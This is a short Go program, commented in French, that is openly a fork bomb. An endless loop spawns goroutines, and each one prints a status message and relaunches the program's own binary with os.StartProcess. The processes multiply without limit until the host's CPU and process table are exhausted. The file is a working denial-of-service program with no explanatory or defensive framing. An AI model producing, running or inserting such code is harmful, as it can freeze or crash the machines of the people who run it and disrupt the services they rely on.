package main

import (
	"fmt"

	"os"

	"runtime"

	"time"
)

func main() {

	for {

		for i := 0; i < runtime.NumCPU(); i++ {

			go func() {

				for {

					fmt.Println("Fork bomb en cours...")

					time.Sleep(1 * time.Second)

					// Créer un nouveau processus fils

					os.Executable()

					os.StartProcess(os.Args[0], os.Args, &os.ProcAttr{})

				}

			}()

		}

	}

}
